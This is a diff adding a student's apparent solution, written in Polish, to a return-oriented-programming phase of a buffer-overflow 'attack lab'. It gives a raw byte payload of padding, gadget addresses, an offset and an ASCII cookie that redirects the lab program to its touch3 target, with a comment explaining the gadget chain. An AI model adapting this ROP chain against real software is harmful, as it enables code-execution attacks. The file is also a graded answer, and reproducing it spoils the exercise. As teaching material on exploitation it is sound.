@@ -1,0 +1,40 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Krzysztof Chmiel, 316749
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+66 1e 40 00 00 00 00 00 
+77 1d 40 00 00 00 00 00
+6c 1d 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+e8 1d 40 00 00 00 00 00
+38 1e 40 00 00 00 00 00
+b0 1d 40 00 00 00 00 00
+95 1d 40 00 00 00 00 00
+77 1d 40 00 00 00 00 00
+c7 1c 40 00 00 00 00 00
+32 34 66 64 31 34 38 63
+
+
+/*
+ * Tutaj będziemy używać masy gadżetów. Najważniejsze jest, żeby szukjac ich na farmie pamietac o tym, że tylko 90 i wartosci takie jak
+ * 38 db czy 20 c0 (z ostatniej tabelki) nie zmienia tam dzialania progarmu, wiec szukajac gadzetow w linijce z gadzzetem po adresie 
+ * gadzetu moga wystepowac tylko te wyzej wymienione bajty. Przechodzac jednak do powyższego rozwiazania. PIerwsze piec to po raz kolejny 
+ * zapchanie bufora, potem mamy adresy gadzetow kodujacych mov rsp rax oraz linie nizej mov rax rdi. Nastepna linijka to adrs gdzie
+ * znajdziemy 58, które jest zakodowaniem pop rax-a. Następnie mamy 72 bajtowy (w hexie 0x48) offset do miejsce gdzie mamy string
+ * z ciastkiem zakodowany w ascii (ostatnia linijka). Widzimy, że opiswane linijki dzieli 9 linii po 8 bajtów każda, czyli w sumie 72.
+ * Nastpenie mamy 3 gadzety robice odpowiednio 89 c1, 89 ca, 89 d6, czyli z tabelki mov eax ecx, mov ecx edx i mov edx esi. W farmie
+ * mamy kilka pasujących adresów, żeby zakodowac je, niestety wiekszosc nie pasuje, bowiem nie spelnia opisanej na poczatku wlasnosci,
+ * tj. po intersujacych nas bajtach moga byc tylko bajty z tablicy nr 4 oraz 90. Potem jest linijka, która jest adresem pocczatku
+ * procedury addxy, która to funkcja sumuje rdi i rsi i zapisuje do raxa. POtem powtorzona linijka przenoszaca raxa do rdi. A na koncu
+ * adrs poczatku procedury touch3 (Przedostatnia linijka). Ostatnia już wczesniej opisana jest ascii ciastkiem. 
+ */
